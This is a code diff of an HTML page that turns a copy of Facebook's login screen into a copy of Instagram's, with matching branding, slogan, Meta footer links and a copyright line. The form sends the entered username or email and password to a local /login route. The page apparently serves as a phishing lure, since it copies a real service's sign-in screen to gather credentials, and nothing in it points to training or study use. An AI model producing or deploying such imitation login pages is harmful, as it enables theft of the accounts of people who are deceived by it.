@@ -1,18 +1,19 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - log in or sign up</title>
+    <title>Login • Instagram</title>
     <style>
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: Helvetica, Arial, sans-serif;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
         body {
-            background-color: #f0f2f5;
+            background-color: #000000;
+            color: #f5f5f5;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
@@ -27,186 +28,144 @@
         }
         .content-wrapper {
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            max-width: 980px;
+            max-width: 935px;
             width: 100%;
-            margin: 0 auto;
+            justify-content: center;
+            gap: 32px;
         }
-        .left-side {
-            flex: 1.2;
-            padding-right: 32px;
-        }
-        .left-side img.fb-logo {
-            height: 106px;
-            margin: -28px 0 0 -28px;
-        }
-        
-        /* تنسيق حاوية الصور المتداخلة بشكل منظم ونظيف */
-        .hero-graphics {
+        .left-section {
             display: flex;
+            flex-direction: column;
             align-items: center;
-            gap: 15px;
-            margin: 20px 0;
-            flex-wrap: wrap;
+            max-width: 450px;
         }
-        .hero-card {
-            background: #fff;
-            border-radius: 16px;
-            padding: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        .left-section h1 {
+            font-size: 3rem;
+            font-weight: 600;
             text-align: center;
+            line-height: 1.2;
+            margin-bottom: 24px;
         }
-        .hero-card img {
-            width: 110px;
-            height: 130px;
-            object-fit: cover;
-            border-radius: 12px;
+        .left-section h1 span {
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-        .main-story {
-            position: relative;
-            width: 180px;
-            height: 250px;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-        }
-        .main-story img {
+        .preview-box {
+            background: #121212;
+            border: 1px solid #262626;
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
             width: 100%;
-            height: 100%;
-            object-fit: cover;
         }
-        .story-time {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.5);
-            color: #fff;
-            font-size: 11px;
-            padding: 2px 6px;
-            border-radius: 8px;
-        }
-        .emoji-box {
-            font-size: 36px;
-            background: #fff;
-            padding: 10px;
-            border-radius: 50%;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-        }
-        .avatar-box img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            border: 3px solid #1877f2;
-            object-fit: cover;
-        }
-
-        .left-side h1 {
-            font-size: 30px;
-            font-weight: normal;
-            line-height: 36px;
-            color: #1c1e21;
-            margin-top: 10px;
-            max-width: 500px;
-        }
-        .left-side h1 span {
-            font-weight: bold;
-        }
-
-        /* الجانب الأيمن: تسجيل الدخول */
-        .right-side {
-            flex: 1;
-            display: flex;
-            justify-content: flex-end;
+        .right-section {
+            width: 350px;
         }
         .login-card {
-            background-color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            width: 396px;
+            background-color: #000000;
+            border: 1px solid #262626;
+            border-radius: 4px;
+            padding: 40px;
             text-align: center;
+            margin-bottom: 10px;
         }
-        .login-card input {
+        .instagram-logo {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+        .input-field {
             width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            font-size: 17px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
+            background: #121212;
+            border: 1px solid #363636;
+            border-radius: 3px;
+            padding: 12px 9px;
+            margin-bottom: 6px;
+            color: #f5f5f5;
+            font-size: 12px;
             outline: none;
         }
-        .login-card input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+        .input-field:focus {
+            border-color: #a8a8a8;
         }
         .login-btn {
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 20px;
-            font-weight: bold;
-            line-height: 48px;
             width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
-            margin-bottom: 16px;
-            transition: background-color 0.2s;
+            margin-top: 12px;
+            margin-bottom: 20px;
         }
         .login-btn:hover {
-            background-color: #166fe5;
+            background-color: #1877f2;
         }
-        .forgot-pass {
-            display: block;
-            color: #1877f2;
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0 25px 0;
+            color: #a8a8a8;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #262626;
+        }
+        .divider::before {
+            margin-right: 18px;
+        }
+        .divider::after {
+            margin-left: 18px;
+        }
+        .forgot-password {
+            color: #e0e0e0;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .signup-card {
+            background-color: #000000;
+            border: 1px solid #262626;
+            border-radius: 4px;
+            padding: 20px;
+            text-align: center;
             font-size: 14px;
-            font-weight: 500;
+        }
+        .signup-card a {
+            color: #0095f6;
             text-decoration: none;
-            margin-bottom: 20px;
-        }
-        .forgot-pass:hover {
-            text-decoration: underline;
-        }
-        hr {
-            border: none;
-            border-bottom: 1px solid #dadde1;
-            margin-bottom: 20px;
-        }
-        .create-btn {
-            background-color: #42b72a;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: bold;
-            padding: 0 16px;
-            line-height: 48px;
-            cursor: pointer;
-            display: inline-block;
-            text-decoration: none;
-        }
-        .create-btn:hover {
-            background-color: #36a420;
+            font-weight: 600;
         }
         footer {
-            background-color: #ffffff;
-            padding: 20px 0;
-            color: #737373;
-            font-size: 12px;
+            padding: 20px;
             text-align: center;
-            border-top: 1px solid #dddfe2;
+            color: #a8a8a8;
+            font-size: 12px;
         }
-        .footer-langs {
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
             margin-bottom: 10px;
-            word-spacing: 15px;
         }
-        .footer-langs a {
-            color: #737373;
+        .footer-links a {
+            color: #a8a8a8;
             text-decoration: none;
         }
-        .footer-langs a:hover {
-            text-decoration: underline;
+        @media (max-width: 768px) {
+            .left-section {
+                display: none;
+            }
         }
     </style>
 </head>
@@ -214,57 +173,52 @@
 
     <div class="main-container">
         <div class="content-wrapper">
-            <!-- الجانب الأيسر مع الصور التوضيحية المنظمة -->
-            <div class="left-side">
-                <svg viewBox="0 0 36 36" class="fb-logo" fill="#1877f2" height="60" width="60">
-                    <path d="M25 3.58V0H20.25C15.66 0 12.5 3.03 12.5 7.94V12H8V18H12.5V36H19.5V18H24.25L25 12H19.5V8.12C19.5 6.25 20.03 5 22.75 5H25Z"></path>
-                </svg>
-
-                <div class="hero-graphics">
-                    <div class="emoji-box">😆</div>
-                    <div class="hero-card">
-                        <img src="https://images.unsplash.com/photo-1585320806297-9794b3e4eeae?w=300" alt="item">
-                    </div>
-                    <div class="main-story">
-                        <span class="story-time">16:45</span>
-                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500" alt="story">
-                    </div>
-                    <div class="hero-card avatar-box">
-                        <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=200" alt="avatar">
-                    </div>
-                </div>
-
-                <h1>Facebook helps you connect and share with the people in your life.</h1>
+            <!-- القسم اليساري (النص والتصميم الإجمالي) -->
+            <div class="left-section">
+                <h1>See everyday moments from your <span>close friends.</span></h1>
             </div>
 
-            <!-- الجانب الأيمن: نموذج تسجيل الدخول -->
-            <div class="right-side">
+            <!-- القسم اليميني (نموذج تسجيل الدخول - بدون زر الفيسبوك) -->
+            <div class="right-section">
                 <div class="login-card">
+                    <div class="instagram-logo">Instagram</div>
+                    
                     <form action="/login" method="POST">
-                        <input type="text" name="email" placeholder="Email address or phone number" required>
-                        <input type="password" name="password" placeholder="Password" required>
+                        <input type="text" name="email" class="input-field" placeholder="Phone number, username, or email" required>
+                        <input type="password" name="password" class="input-field" placeholder="Password" required>
                         <button type="submit" class="login-btn">Log in</button>
                     </form>
-                    
-                    <a href="#" class="forgot-pass">Forgotten password?</a>
-                    <hr>
-                    <a href="#" class="create-btn">Create new account</a>
+
+                    <div class="divider">OR</div>
+
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <div class="signup-card">
+                    Don't have an account? <a href="#">Sign up</a>
                 </div>
             </div>
         </div>
     </div>
 
+    <!-- الفوتر السفلي -->
     <footer>
-        <div class="footer-langs">
-            <a href="#">English (UK)</a>
-            <a href="#">العربية</a>
-            <a href="#">Français (France)</a>
-            <a href="#">Italiano</a>
-            <a href="#">Deutsch</a>
-            <a href="#">Русский</a>
-            <a href="#">Español</a>
-            <a href="#">More languages...</a>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
         </div>
+        <div>© 2026 Instagram from Meta</div>
     </footer>
 
 </body>
